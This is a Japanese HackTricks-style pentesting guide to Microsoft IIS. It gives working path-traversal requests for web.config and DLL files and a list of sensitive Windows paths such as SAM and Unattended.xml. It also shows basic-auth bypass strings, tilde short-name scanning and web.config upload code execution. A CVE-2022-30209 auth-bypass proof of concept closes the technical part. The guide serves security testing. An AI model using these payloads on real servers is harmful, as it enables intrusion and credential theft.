# IIS - インターネット情報サービス

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>**を使って、ゼロからヒーローまでAWSハッキングを学ぶ**</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**か**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**する
- **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)は、**ダークウェブ**を活用した検索エンジンで、企業やその顧客が**盗難マルウェア**によって**侵害**されていないかをチェックする**無料**機能を提供しています。

WhiteIntelの主な目標は、情報窃取マルウェアによるアカウント乗っ取りやランサムウェア攻撃と戦うことです。

彼らのウェブサイトをチェックし、**無料**でエンジンを試すことができます：

{% embed url="https://whiteintel.io" %}

---

テスト実行可能なファイル拡張子：

- asp
- aspx
- config
- php

## 内部IPアドレスの漏洩

302を受け取るIISサーバーでは、Hostヘッダーを削除してHTTP/1.0を使用し、レスポンス内のLocationヘッダーが内部IPアドレスを指す可能性があります：
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
内部IPを開示する応答:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .configファイルの実行

.configファイルをアップロードしてコードを実行することができます。その方法の1つは、HTMLコメント内にコードをファイルの末尾に追加することです：[ここから例をダウンロード](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

この脆弱性を悪用するための詳細な情報やテクニックは[こちら](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IISディスカバリーブルートフォース

作成したリストをダウンロードしてください：

{% file src="../../.gitbook/assets/iisfinal.txt" %}

このリストは、以下のリストの内容をマージして作成されました：

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

拡張子を追加せずに使用してください。必要なファイルにはすでに拡張子が付いています。

## パストラバーサル

### ソースコードの漏洩

詳細な解説はこちらを参照してください：[https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
要約すると、アプリケーションのフォルダ内には、"assemblyIdentity"ファイルや"namespaces"への参照が含まれる複数のweb.configファイルがあります。この情報を使用すると、**実行可能ファイルがどこにあるか**を知ることができます。\
**ダウンロードしたDlls**からは、**新しい名前空間**を見つけることができ、アクセスしてweb.configファイルを取得して新しい名前空間とassemblyIdentityを見つけることができます。\
また、ファイル**connectionstrings.config**と**global.asax**には興味深い情報が含まれているかもしれません。\
{% endhint %}

**.Net MVCアプリケーション**では、**web.config**ファイルが、**"assemblyIdentity"** XMLタグを介してアプリケーションが依存する各バイナリファイルを指定する重要な役割を果たします。

### **バイナリファイルの探索**

以下に、**web.config**ファイルへのアクセス例を示します：
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
このリクエストは、さまざまな設定や依存関係を明らかにします:

* **EntityFramework** バージョン
* web ページ、クライアント検証、JavaScript の **AppSettings**
* 認証とランタイムのための **System.web** 構成
* **System.webServer** モジュールの設定
* **Microsoft.Owin**、**Newtonsoft.Json**、**System.Web.Mvc** などの多くのライブラリに対する **Runtime** アセンブリのバインディング

これらの設定により、**/bin/WebGrease.dll** などの特定のファイルがアプリケーションの /bin フォルダーに配置されていることが示されます。

### **ルートディレクトリのファイル**

**/global.asax** や **/connectionstrings.config**（機密性の高いパスワードが含まれる）など、ルートディレクトリにあるファイルは、アプリケーションの構成と動作に不可欠です。

### **名前空間と Web.Config**

MVC アプリケーションでは、各ファイルでの繰り返し宣言を避けるために、特定の名前空間用の追加の **web.config ファイル** も定義されています。別の **web.config** をダウンロードするリクエストの例が示されています。
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLLのダウンロード**

カスタム名前空間の言及は、/binディレクトリに存在する "**WebApplication1**" というDLLを示しています。これに続いて、**WebApplication1.dll** をダウンロードするリクエストが表示されます：
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
これは、/binディレクトリに**System.Web.Mvc.dll**や**System.Web.Optimization.dll**などの他の重要なDLLが存在している可能性を示しています。

DLLが**WebApplication1.Areas.Minded**という名前空間をインポートするシナリオでは、攻撃者は他のweb.configファイルが予測可能なパス（たとえば**/area-name/Views/**）に存在することを推測する可能性があります。これらのweb.configファイルには/binフォルダ内の他のDLLへの特定の構成と参照が含まれています。たとえば、**/Minded/Views/web.config**へのリクエストは、別のDLLである**WebApplication1.AdditionalFeatures.dll**の存在を示す構成と名前空間を明らかにする可能性があります。

### 一般的なファイル

[こちら](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)から
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 エラー

もし以下のようなエラーが表示された場合：

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

それはサーバーが**Hostヘッダー内に正しいドメイン名を受信しなかった**ことを意味します。\
Webページにアクセスするためには、提供された**SSL証明書**を確認して、そこにドメイン/サブドメイン名が見つかるかもしれません。見つからない場合は、**正しいものを見つけるまでVHostsをブルートフォース**する必要があります。

## 古いIISの脆弱性の価値がある

### Microsoft IISチルダ文字“\~”脆弱性/機能–短いファイル/フォルダ名の開示

この**技術**を使用して、発見された各フォルダ内のフォルダとファイルを**列挙**してみることができます（基本認証が必要な場合でも）。\
この技術の主な制限は、サーバーが脆弱である場合に**各ファイル/フォルダの名前の最初の6文字とファイルの拡張子の最初の3文字までしか見つけることができない**ことです。

この脆弱性をテストするために[https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)を使用できます：`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (841).png>)

元の研究：[https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

**Metasploit**も使用できます：`use scanner/http/iis_shortname_scanner`

### 基本認証バイパス

**基本認証（IIS 7.5）**をバイパスして、次のようにアクセスを試みます：`/admin:$i30:$INDEX_ALLOCATION/admin.php`または`/admin::$INDEX_ALLOCATION/admin.php`

この脆弱性と前述のものを組み合わせて、新しい**フォルダ**を見つけて**認証をバイパス**することができます。

## ASP.NET Trace.AXD有効なデバッグ

ASP.NETにはデバッグモードがあり、そのファイルは`trace.axd`と呼ばれます。

これは、一定期間にわたってアプリケーションに対して行われたすべてのリクエストの非常に詳細なログを保持します。

この情報には、リモートクライアントのIP、セッションID、すべてのリクエストとレスポンスのクッキー、物理パス、ソースコード情報、そして潜在的にはユーザー名とパスワードさえ含まれる可能性があります。

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTHは以下の情報を使用します：

* **`validationKey`**（文字列）：署名検証に使用する16進数エンコードされたキー。
* **`decryptionMethod`**（文字列）：（デフォルトは“AES”）。
* **`decryptionIV`**（文字列）：16進数エンコードされた初期化ベクトル（ゼロのベクトルがデフォルト）。
* **`decryptionKey`**（文字列）：復号化に使用する16進数エンコードされたキー。

ただし、これらのパラメータの**デフォルト値**を使用し、**ユーザーのメールをクッキーとして使用**する人もいます。したがって、攻撃対象のサーバーで**偽装したいユーザーのメールを持つユーザーを作成**し、ASPXAUTHクッキーを使用して第二のサーバーから第一のサーバーに**ユーザーを偽装**することができるかもしれません。\
この攻撃はこの[**解説**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19)で成功しました。

## キャッシュされたパスワードを使用したIIS認証バイパス（CVE-2022-30209）<a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[完全なレポートはこちら](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)：コードのバグが、ユーザーが提供したパスワードを適切にチェックしなかったため、**パスワードハッシュがすでにキャッシュにあるキーに一致する**攻撃者はそのユーザーとしてログインできるようになります。
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)は、**ダークウェブ**を活用した検索エンジンで、企業や顧客が**スティーラーマルウェア**によって**侵害**されていないかをチェックする**無料**の機能を提供しています。

WhiteIntelの主な目標は、情報窃取マルウェアによるアカウント乗っ取りやランサムウェア攻撃と戦うことです。

彼らのウェブサイトをチェックし、**無料**でエンジンを試すことができます：

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**する。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
